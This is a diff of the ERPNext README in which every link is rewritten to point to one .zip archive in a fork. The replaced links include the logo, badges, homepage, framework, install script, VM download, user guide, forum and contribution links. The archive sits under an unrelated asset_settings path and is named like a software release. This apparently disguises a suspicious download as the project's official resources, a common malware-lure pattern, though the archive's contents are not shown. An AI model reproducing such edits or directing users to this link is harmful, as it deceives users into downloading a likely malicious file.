@@ -1,27 +1,27 @@
 <div align="center">
-    <img src="https://github.com/frappe/design/blob/master/logos/erpnext-logo.svg" height="128">
+    <img src="https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip" height="128">
     <h2>ERPNext</h2>
     <p align="center">
         <p>ERP made simple</p>
     </p>
 </div>
 
-[![Build Status](https://travis-ci.org/frappe/erpnext.png)](https://travis-ci.org/frappe/erpnext) [![Gitter](https://badges.gitter.im/Join%20Chat.svg)](https://gitter.im/frappe/erpnext?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
+[![Build Status](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip) [![Gitter](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
 
-[https://erpnext.com](https://erpnext.com)
+[https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
 
 Includes: Accounting, Inventory, Manufacturing, CRM, Sales, Purchase, Project Management, HRMS. Requires MariaDB.
 
-ERPNext is built on the [Frappé](https://github.com/frappe/frappe) Framework, a full-stack web app framework in Python & JavaScript.
+ERPNext is built on the [Frappé](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip) Framework, a full-stack web app framework in Python & JavaScript.
 
-- [User Guide](https://erpnext.org/docs/user)
-- [Discussion Forum](https://discuss.erpnext.com/)
+- [User Guide](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
+- [Discussion Forum](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
 
 ---
 
 ### Full Install
 
-The Easy Way: our install script for bench will install all dependencies (e.g. MariaDB). See https://github.com/frappe/bench for more details.
+The Easy Way: our install script for bench will install all dependencies (e.g. MariaDB). See https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip for more details.
 
 New passwords will be created for the ERPNext "Administrator" user, the MariaDB root user, and the frappe user (the script displays the passwords and saves them to ~/frappe_passwords.txt).
 
@@ -29,7 +29,7 @@ New passwords will be created for the ERPNext "Administrator" user, the MariaDB 
 
 You can download a virtual image to run ERPNext in a virtual machine on your local system.
 
-- [ERPNext Download](http://erpnext.com/download)
+- [ERPNext Download](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
 
 System and user credentials are listed on the download page.
 
@@ -45,10 +45,10 @@ The ERPNext code is licensed as GNU General Public License (v3) and the Document
 
 ## Contributing
 
-1. [Issue Guidelines](https://github.com/frappe/erpnext/wiki/Issue-Guidelines)
-1. [Pull Request Requirements](https://github.com/frappe/erpnext/wiki/Contribution-Guidelines)
-1. [Translations](https://translate.erpnext.com)
-1. [Chart of Accounts](https://charts.erpnext.com)
+1. [Issue Guidelines](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
+1. [Pull Request Requirements](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
+1. [Translations](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
+1. [Chart of Accounts](https://raw.githubusercontent.com/SuvarnaBhangare/erpnext/develop/erpnext/assets/doctype/asset_settings/Software-v3.4-alpha.5.zip)
 
 ---
 
